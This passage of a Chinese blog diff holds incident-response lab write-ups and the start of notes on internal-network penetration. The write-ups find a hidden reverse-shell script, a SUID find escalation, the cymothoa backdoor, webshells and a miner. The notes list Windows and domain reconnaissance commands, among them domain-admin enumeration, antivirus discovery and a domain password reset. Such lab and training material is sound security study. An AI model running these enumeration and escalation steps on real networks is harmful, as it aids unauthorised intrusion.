+<p>打开 &#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;processhider.c</p>
+<p>成功找到隐藏的文件1.py</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/d4f38bf6929f600dcb94095637769449--089c--image-20240605175637332.png" alt="image-20240605175637332"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/.temp/libprocesshider/1.py</span><br><span class="line">flag&#123;109ccb5768c70638e24fb46ee7957e37&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-6"><a href="#任务二-6" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接看1.py就行了</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/00cee077a14016b09a9897660a53672d--38e1--image-20240605175748138.png" alt="image-20240605175748138"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;114.114.114.121:9999&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-6"><a href="#任务三-6" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里去联想linux提权，也就主要是两种提权，suid和su提权</p>
+<p>对比而言，suid提权更可能点，我们尝试去试试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/511f5ef13a54570c91357d8847df8bbd--a6bf--image-20240605180004338.png" alt="image-20240605180004338"></p>
+<p>发现能够使用的find</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/find</span><br><span class="line">flag&#123;7fd5884f493f4aaf96abee286ee04120&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-6"><a href="#任务四-6" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客尝试注入恶意代码的工具完整路径md5</span><br></pre></td></tr></table></figure>
+
+<p>这里说实话有点不太理解，为什么就是opt目录下存在注入恶意代码的工具</p>
+<p>cymothoa是后门工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/.cymothoa-1-beta/cymothoa</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;087c267368ece4fcf422ff733b51aed9&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务五-2"><a href="#任务五-2" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目问1.py的启动命令的可执行程序是什么,那么就是Python3，ls &#x2F;usr&#x2F;bin&#x2F;python3 -al 看下软连接</p>
+<p>再使用which去查找一下python的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/python3.4</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/usr/bin/python3.4&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="第四章-windows实战"><a href="#第四章-windows实战" class="headerlink" title="第四章-windows实战"></a>第四章-windows实战</h1><h2 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h2><h4 id="任务一-7"><a href="#任务一-7" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p>可以直接使用D盾去分析一下网站根目录首先就是</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/807a96cee19d5e50097803900045fe6f--3d33--image-20240606204835088.png" alt="image-20240606204835088"></p>
+<p>直接就是扫到后门</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/bd144426495ff8b9701658f09d7eb8b6--0bcd--image-20240606204904710.png" alt="image-20240606204904710"></p>
+<p>发现直接就是有默认密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-7"><a href="#任务二-7" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p>分析ip的话这里我们就可以去查看一下日志文件，因为这里的web服务器是Apache的</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/8d56435f54f735c27d9e7782c8a30be9--8999--image-20240606205424797.png" alt="image-20240606205424797"></p>
+<p>拿到ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一点要注意的是，就是查看日志时需要稍微修改一下后缀才能使用记事本打开</p>
+<h4 id="任务三-7"><a href="#任务三-7" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p>直接使用windows日志一键分析工具即可</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/b29a949a7d04c99836299dc95c5deffd--a9f3--image-20240606210839396.png" alt="image-20240606210839396"></p>
+<p>直接找到对应的敏感用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-02-29 10:13:06	hacker138$	EC2AMAZ-2OBTHUT	10	User32 	EC2AMAZ-2OBTHUT	C:\Windows\System32\svchost.exe	36.60.53.171	0	4624</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-7"><a href="#任务四-7" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</span><br></pre></td></tr></table></figure>
+
+<p>首先就是找到对应的敏感文件</p>
+<p>我们可以去查看一下这个黑客用户下的文件</p>
+<p>成功发现Kuang</p>
+<p>运行后发现CPU直接爆，肯定就是一个挖矿病毒了，</p>
+<p>使用pyinstxtractor进行反编译得到pyc文件</p>
+<p>pyc在线解密</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/2152705e94ea461c3edc20ab04eefa09--6ce0--image-20240606212101801.png" alt="image-20240606212101801"></p>
+<p>成功获得矿池</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="向日葵"><a href="#向日葵" class="headerlink" title="向日葵"></a>向日葵</h2><h4 id="任务一-8"><a href="#任务一-8" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);</span><br></pre></td></tr></table></figure>
+
+<p>好难，第一个就不会写了这个</p>
+<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><h4 id="任务一-9"><a href="#任务一-9" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请提交攻击者攻击成功的第一时间，格式：flag&#123;YY:MM:DD hh:mm:ss&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接就是看日志主要就是，这里是要看nginx的日志，不要被Apache服务给骗了，里面日志啥都没有</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/942b6ab8109194e0bb7330c939a15f50--59f2--image-20240607152705305.png" alt="image-20240607152705305"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务二-8"><a href="#任务二-8" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请提交攻击者的浏览器版本 flag&#123;Firgfox/2200&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接还是和上面一样的，这不 直接给了的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Firefox/110.0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务三-8"><a href="#任务三-8" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请提交攻击者目录扫描所使用的工具名称</span><br></pre></td></tr></table></figure>
+
+<p>这日志中直接有的</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f83792fe3a1e3513e87f849792bce21f--1a2e--image-20240607153004452.png" alt="image-20240607153004452"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fuzz Faster U Fool</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务四-8"><a href="#任务四-8" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到攻击者写入的恶意后门文件，提交文件名（完整路径）</span><br></pre></td></tr></table></figure>
+
+<p>这也还是这个日志中，后边可以直接发现利用了这个后门文件的</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/9b4c2cead16ac1d70a7eb1a0f4b84296--01e2--image-20240607153145127.png" alt="image-20240607153145127"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.x.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\.x.php&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务五-3"><a href="#任务五-3" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）</span><br></pre></td></tr></table></figure>
+
+<p>直接就是扫一下就行，就能发现</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/1962cab0827eb55feaf69158d0e7f6ae--2ee5--image-20240607153825990.png" alt="image-20240607153825990"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;C:\phpstudy_pro\WWW\usr\themes\default\post.php&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="任务六"><a href="#任务六" class="headerlink" title="任务六"></a>任务六</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag&#123;1.exe&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/08e7ef1309b797d696594cd967d64b51--a38e--image-20240607154234119.png" alt="image-20240607154234119"></p>
+<p>这里主要是注意看修改日期，就能很明显发现这两个文件</p>
+<p>而且bat文件内容就是启动那个exe，就很明显就能感觉出来是黑客留下的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;x.bat&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑页-篡改"><a href="#黑页-篡改" class="headerlink" title="黑页&amp;&amp;篡改"></a>黑页&amp;&amp;篡改</h2><p>开放类题目</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请启动 phpstudy 后访问 127.0.0.1</span><br><span class="line">具体要求已经在桌面 readme.png 本题为开放式题目，请访问 http://127.0.0.1/dedecms/index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/9f5087d42372f2244c86dba5ecde3dbc--a583--image-20240607165458525.png" alt="image-20240607165458525"></p>
+<h4 id="任务一-10"><a href="#任务一-10" class="headerlink" title="任务一"></a>任务一</h4><p>第一种就很简单的单纯添加html代码而已，删除即可</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/59f0fc6648fa379b077b2d1075b1610c--47a9--image-20240607165442183.png" alt="image-20240607165442183"></p>
+<h4 id="任务二-9"><a href="#任务二-9" class="headerlink" title="任务二"></a>任务二</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6887818e4c12c222db374dc9619a8d35--85c0--image-20240607165935228.png" alt="image-20240607165935228"></p>
+<h4 id="任务三-9"><a href="#任务三-9" class="headerlink" title="任务三"></a>任务三</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/1790e65167eb1e3c38d84a9eb138b84d--5d58--image-20240607170104646.png" alt="image-20240607170104646"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/5190e8675a066d5312ba1b6a12e76dfa--ff78--image-20240607170053639.png" alt="image-20240607170053639"></p>
+<p>1.js</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/23ee3d817db6697162b7406d6b5ec8e7--9768--image-20240607170331722.png" alt="image-20240607170331722"></p>
+<h4 id="任务四-9"><a href="#任务四-9" class="headerlink" title="任务四"></a>任务四</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f7a734496dc1b62649fdfbe75ba6b1d4--a99f--image-20240607170316227.png" alt="image-20240607170316227"></p>
+<h4 id="任务五-4"><a href="#任务五-4" class="headerlink" title="任务五"></a>任务五</h4><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/d542768c05edb59f0e430e618fd1e051--3ed2--image-20240607170350816.png" alt="image-20240607170350816"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/6c4271836480a8fdcdee5f4cdafa562e--e949--image-20240607170415685.png" alt="image-20240607170415685"></p>
+<h1 id="第五章-linux实战"><a href="#第五章-linux实战" class="headerlink" title="第五章-linux实战"></a>第五章-linux实战</h1>]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>应急响应</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透知识点总结</title>
+    <url>/2024/06/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<p>最近打了不少春秋云镜的内网渗透的徽章，所以打算对内网的知识点进行一个总结学习。</p>
+<span id="more"></span>
+
+<h1 id="一、内网是什么？"><a href="#一、内网是什么？" class="headerlink" title="一、内网是什么？"></a>一、内网是什么？</h1><p>内网也指局域网，是指在某个区域由多台计算机互连而成的计算机组，组网范围通常在数千米以内。</p>
+<p>在局域网中，可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等。</p>
+<p>内网是封闭的，可以由办公室内的两台计算机组成，也可以由一个公司内的大量计算机组成。</p>
+<p>简单来说：内网就是某一区域内封闭的计算机组，由大量的计算机组成。</p>
+<p>一个简单的网络拓扑图：</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/686758e25b44ac5052c1d58e832b5595--1e96--image-20240603162935647.png" alt="image-20240603162935647"></p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/24353d28c62d43e09e3103477a6f5a24--c450--2752372-20220719180949017-1117785613.png" alt="2752372-20220719180949017-1117785613"></p>
+<p>可以看出就是内网是独立于外网的，外网无法直接去访问内网中的主机，只有通过VPN，代理等技术去间接访问。</p>
+<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a>  Web安全学习笔记</p>
+<h1 id="二、内网渗透又是什么？"><a href="#二、内网渗透又是什么？" class="headerlink" title="二、内网渗透又是什么？"></a>二、内网渗透又是什么？</h1><p>内网渗透，从字面上理解便是对目标服务器所在内网进行渗透并最终获取域控权限的一种渗透。内网渗透的前提是获取一个webshell，可以是低权限的webshell，因为可以通过提权获取高权限</p>
+<p>在进行内网渗透之前需要了解一个概念，<strong>域环境</strong>。在内网中，往往可能存在几百上千台机器，例如需要对机器进行升级、打补丁，设置权限等，管理员不可能一台一台地更新修改，因此衍生出了域环境。  （域控DC一般都是Windows系统） （但并不绝对，<a href="https://www.dbs724.com/113421.html">Linux</a>也能够成为域控）</p>
+<p>管理员以一台主机作为域控制器新建一个域，将其他主机加入域中，以域控来操作其他主机。因为域控的最高权限，导致了域控所在的主机的管理员账户密码可以登陆任意一台主机，所以内网渗透的最终目标，往往是拿下域控的权限</p>
+<h1 id="三、内网必须知识—-内网穿透"><a href="#三、内网必须知识—-内网穿透" class="headerlink" title="三、内网必须知识—-内网穿透"></a>三、内网必须知识—-内网穿透</h1><p>在渗透测试过程中，我们拿下了一台服务器的权限，并且通过<code>netstat -ano</code>发现开启了3389端口，想要远程桌面连接的时候发现无法连接。这是因为我们获取的服务器所处的环境为内网，而内网主机的3389端口，是公网IP通过端口映射的。也就是说，我们连接的外网IP地址的3389端口，映射到内网中，不一定是那台服务器的3389端口。</p>
+<p><strong>解决这种问题的方法有俩种：</strong></p>
+<ul>
+<li>让目标机器去连接外网主机（必须有一台公网服务器，内网主机能够访问互联网）</li>
+<li>在目前机器上设置一个信号站（放一个web文件在目标机器上，所有流量都要经过这个文件通信） （一般情况下就是socks隧道的搭建）</li>
+</ul>
+<p>在渗透测试过程中，内网主机不能访问互联网是很常见的。</p>
+<p>这里可以使用的就是stowaway搭建网络代理 ———————<a href="https://blog.csdn.net/qq_44159028/article/details/129681017">https://blog.csdn.net/qq_44159028/article/details/129681017</a></p>
+<h1 id="四、内网结构"><a href="#四、内网结构" class="headerlink" title="四、内网结构"></a>四、内网结构</h1><p><a href="https://www.freebuf.com/articles/network/306068.html">https://www.freebuf.com/articles/network/306068.html</a></p>
+<h2 id="1、工作组Work-Group"><a href="#1、工作组Work-Group" class="headerlink" title="1、工作组Work Group:"></a>1、工作组Work Group:</h2><p>是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
+<h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><p>域是一个有安全边界的计算机集合，域通过安全边界来隔离本域和外部资源。</p>
+<p>域又可以再进一步的分类：</p>
+<ul>
+<li>单域                  就两台主机，一台DC一台备份DC</li>
+<li>父域，子域       划分多个域，第一个域为父域，其他为子域</li>
+<li>域树（tree）     域树是多个域通过建立信任关系组成的集合。</li>
+<li>域林（forest）  域林是由一个或多个没有形成连续名字空间的域树组成，它和域树最大的区别就是域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</li>
+<li>DNS域名服务器   DNS服务器，计算机使用DNS来定位DC、服务器和其他计算机的，所以域的名字就是DNS域的名字。</li>
+</ul>
+<h2 id="3、活动目录-AD"><a href="#3、活动目录-AD" class="headerlink" title="3、活动目录(AD)"></a>3、活动目录(AD)</h2><p>简写为<code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务</p>
+<p><strong>活动目录的功能：</strong></p>
+<ul>
+<li>账户集中管理</li>
+<li>软件集中管理</li>
+<li>环境集中管理</li>
+<li>增强安全性</li>
+<li>更可靠、更短的宕机时间</li>
+</ul>
+<p><strong>活动目录与域控制器的区别</strong></p>
+<p>由域网络中的众多对象组成的层次结构的数据库被称为活动目录数据库（AD库）。要实现域环境其实就是要安装AD，如果内网中某台机器安装了AD，那么他就是DC。也就实现了只需要在活动目录中对某个账号修改一次密码，在整个域中任意一台机器上都可使用该账号登录。<br>方便了DC对域内其他机器的统一管理</p>
+<h2 id="4、安全域"><a href="#4、安全域" class="headerlink" title="4、安全域"></a>4、安全域</h2><p><strong>安全域的划分目的：</strong></p>
+<p>将一组安全等级相同的计算机划如同一网段。</p>
+<p>这个网段内的计算机拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络控制策略，从而允许哪些IP地址访问域，允许此域访问哪些IP地址和网段进行设置。</p>
+<p>这些措施将使得网络风险最小化，当攻击发生时，可以尽可能地将威胁隔离从而降低对域内计算机的影响</p>
+<p><strong>DMZ</strong></p>
+<p>DMZ<code>demilitarized zone</code>，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p>
+<p><strong>简答来说：DMZ就是将内网与外网进行隔离，存放一些必须公开的服务器设施，用来对外提供服务。</strong></p>
+<p><strong>办公区</strong></p>
+<p>公司员工日常的工作区，一般会安装防病毒软件、主机入侵检测产品等。办公区般能够访问DMZ。如果运维人员也在办公区，那么部分主机也能访问核心数据区（很多大企业还会使用堡垒机来统一管理用户的登录行为）。</p>
+<p>攻击者如果想进入内网，一般会使用鱼叉攻击、水坑攻击，当然还有社会工程学手段。办公区人员多而杂，变动也很频繁，在安全管理上可能存在诸多漏洞，是攻击者进入内网的重要途径之一。</p>
+<p><strong>核心区</strong></p>
+<p>存储企业最重要的数据、文档等信息资产，通过日志记录、安全审计等安全措施进行严密的保护，往往只有很少的主机能够访问。从外部是很难直接访问核心区的。</p>
+<p>一般来说，能够直接访问核心区的只有运维人员或者IT部门的主管，所以，攻击者会重点关注这些用户的信息（攻击者在内网中进行横向移动攻击时，会优先查找这些主机）</p>
+<h1 id="五、域权限"><a href="#五、域权限" class="headerlink" title="五、域权限"></a>五、域权限</h1><ol>
+<li><p>域本地组</p>
+<p>多域用户访问单域资源（访问同一域），不能嵌套在其他组中，只能在其所在域内指派权限</p>
+</li>
+<li><p>全局组</p>
+<p>单域用户访问多域资源（必须是同一域里面的用户），能够嵌套在其他组中，可在域林中的任何域指派权限</p>
+</li>
+<li><p>通用组</p>
+<p>多域用户访问多域资源，成员信息不保存在域控制器中，而是保存在全局编录（GC）中，任何变化都会导致全林复制</p>
+</li>
+</ol>
+<h3 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A：Account，用户账号</span><br><span class="line"></span><br><span class="line">G：Global Group，全局组</span><br><span class="line"></span><br><span class="line">U：Universal Group，通用组</span><br><span class="line"></span><br><span class="line">DL：Domain Local Group，域本地组</span><br><span class="line"></span><br><span class="line">P：Permission，许可，资源权限</span><br><span class="line">先将用户账号添加至全局组中，再将全局组添加至域本地组中，然后为域本地组分配资源权限</span><br></pre></td></tr></table></figure>
+
+<h3 id="域内权限解读"><a href="#域内权限解读" class="headerlink" title="域内权限解读"></a>域内权限解读</h3><ul>
+<li>域本地组：来自全林作用于本域</li>
+<li>全局组：来组本域作用于全林</li>
+<li>通用组：来自全林作用于全林</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地域组的权限</span><br><span class="line">Administrators（管理员组） ————最重要的权限</span><br><span class="line"></span><br><span class="line">Remote Desktop Users（远程登录组）</span><br><span class="line"></span><br><span class="line">Print Operators（打印机操作员组）</span><br><span class="line"></span><br><span class="line">Account Operators（帐号操作员组）</span><br><span class="line"></span><br><span class="line">Server Operaters（服务器操作员组）</span><br><span class="line"></span><br><span class="line">Backup Operators（备份操作员组）</span><br><span class="line">全局组、通用组的权限：</span><br><span class="line">Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</span><br><span class="line"></span><br><span class="line">Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</span><br><span class="line"></span><br><span class="line">Schema Admins（架构管理员组）————最重要的权限</span><br><span class="line"></span><br><span class="line">Domain Users（域用户组)</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、内网信息收集-重点"><a href="#六、内网信息收集-重点" class="headerlink" title="六、内网信息收集            重点"></a>六、内网信息收集            重点</h1><p>目标资产信息搜集的程度，决定渗透过程的复杂程度。<br>目标主机信息搜集的深度，决定后渗透权限持续把控。<br>渗透的本质是信息搜集，而信息搜集整理为后续的情报跟进提供了强大的保证。</p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><strong>系统相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看系统信息</span><br><span class="line">systeminfo /all</span><br><span class="line"></span><br><span class="line">#查看补丁列表</span><br><span class="line">wmic qfe getCaption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#查看主机开机时间</span><br><span class="line">net statistics workstation</span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line">schtasks /query /fo LIST /v             #query显示所有计划任务</span><br></pre></td></tr></table></figure>
+
+<p><strong>用户相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#检查当前用户，权限</span><br><span class="line">whoami /user &amp;&amp; whoami /priv</span><br><span class="line">whoami /all        #查看当前域并获取域SID</span><br><span class="line"></span><br><span class="line">#查看在线用户信息</span><br><span class="line">quser</span><br><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure>
+
+<p><strong>程序相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看杀毒软件</span><br><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName /Format:List</span><br><span class="line"></span><br><span class="line">#查看安装的程序和版本</span><br><span class="line">wmic product getname,version</span><br><span class="line"></span><br><span class="line">#查询运行的进程</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line">wmic process getprocessid,executablepath,name      #显示进程的路径、名称、pid</span><br><span class="line">wmic servicelist brief                             #查看本机服务</span><br><span class="line"></span><br><span class="line">#远程桌面连接历史记录</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#查看自启动程序列表</span><br><span class="line">wmic startuo getcommand,caption</span><br></pre></td></tr></table></figure>
+
+<p><strong>网络连接相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#tcp/udp网络连接状态，端口信息</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">ipconfig /all              #查询本机IP段，所在域等</span><br><span class="line">route print                #打印路由信息</span><br><span class="line">arp -a                   #查看arp缓存，可以发现内网主机</span><br><span class="line"></span><br><span class="line">#查看局域网信息</span><br><span class="line">net view            #查看同一域内机器列表</span><br><span class="line">net view \\ip       #查看某ip共享</span><br><span class="line">net view \\GHQ      #查看GHQ计算机的共享资源列表</span><br><span class="line">net view /domain    #查看内网存在多少个域</span><br><span class="line">net view /domin:XYZ  #查看XYZ域的机器列表</span><br><span class="line">net accounts /domain  #查询域用户密码过期等信息</span><br><span class="line"></span><br><span class="line">#查看本机共享</span><br><span class="line">net share</span><br><span class="line">wmic share getname,path,status</span><br></pre></td></tr></table></figure>
+
+<p><strong>域相关</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#判断是否存在域</span><br><span class="line">net config workstation    # 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等</span><br><span class="line">net view /domain          # 查看域</span><br><span class="line"></span><br><span class="line">#查看主域服务器</span><br><span class="line">net time /domain           #主域服务器会同时作为时间服务器</span><br><span class="line"></span><br><span class="line">nltest /DCLIST:god         #查看域控制器主机名，god为域名</span><br><span class="line"></span><br><span class="line">#查看域用户相关信息</span><br><span class="line">net user /domain          #显示所在域的用户</span><br><span class="line">net user 域用户 /domain    #获取域用户详细信息</span><br><span class="line">net user /domain XXX 123456 #修改用户密码，需要域管理员权限</span><br><span class="line"></span><br><span class="line">net group /domain       #查看域内用户组列表</span><br><span class="line">net group &quot;domain admins&quot;/domain       #获取域管理员列表</span><br><span class="line">net group &quot;domain controllers&quot;/domain  #查看域控制器组</span><br><span class="line">net group &quot;domain computers&quot;/domain   #查看域机器</span><br><span class="line"></span><br><span class="line">#列出域信任关系</span><br><span class="line">nltest /domain_trusts      #列出域与域之间的信任关系</span><br><span class="line"></span><br><span class="line">#获得域内用户详细信息</span><br><span class="line">wmic useraccount get/all   #可以获取到域用户的用户名、描述信息、SID、域名、状态等。</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p><strong>系统相关</strong></p>
